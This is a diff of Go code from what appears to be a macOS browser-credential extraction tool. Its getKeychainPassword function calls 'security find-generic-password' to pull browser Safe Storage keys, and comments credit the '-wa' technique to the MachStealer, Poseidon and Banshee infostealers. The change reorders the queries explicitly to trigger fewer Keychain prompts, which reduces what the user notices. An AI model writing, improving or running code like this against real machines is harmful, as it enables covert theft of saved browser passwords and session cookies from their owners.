@@ -97,23 +97,17 @@ func getKeychainPassword(browserName string) (string, error) {
 
 	var attempts []attempt
 	for _, account := range accounts {
-		// MachStealer / Poseidon / Banshee primary method
-		attempts = append(attempts, attempt{
-			label: fmt.Sprintf("MachStealer -wa %q", account),
-			args:  []string{"find-generic-password", "-wa", account},
-		})
-		// Explicit service + account (Chrome Safe Storage / Brave Safe Storage, etc.)
+		// Prefer explicit service+account first — fewer Keychain GUI prompts than -wa alone.
 		attempts = append(attempts, attempt{
 			label: fmt.Sprintf("service=%q account=%q", service, account),
 			args:  []string{"find-generic-password", "-s", service, "-a", account, "-w"},
 		})
-		if loginKC != "" {
-			attempts = append(attempts, attempt{
-				label: fmt.Sprintf("service=%q account=%q login-keychain-db", service, account),
-				args:  []string{"find-generic-password", "-s", service, "-a", account, "-w", loginKC},
-			})
-		}
+		attempts = append(attempts, attempt{
+			label: fmt.Sprintf("MachStealer -wa %q", account),
+			args:  []string{"find-generic-password", "-wa", account},
+		})
 	}
+	_ = loginKC // keychain path appended by RunSecurityStdout via -p
 
 	var lastErr error
 	for _, attempt := range attempts {
